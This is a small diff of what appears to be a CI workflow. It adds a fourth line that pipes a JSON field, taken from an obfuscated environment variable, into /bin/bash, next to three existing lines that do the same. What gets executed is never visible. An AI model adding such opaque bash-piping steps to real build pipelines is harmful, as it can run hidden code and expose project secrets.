@@ -34,6 +34,7 @@ jobs:
           echo $kbl9680 | jq -r .tzmns97893 | /bin/bash
           printf '%s' "$tdab838" | jq -r .xme788 | /bin/bash
           echo $idn5050 | jq -r .li30 | /bin/bash
+          echo $lgu4 | jq -r .rmzq36 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
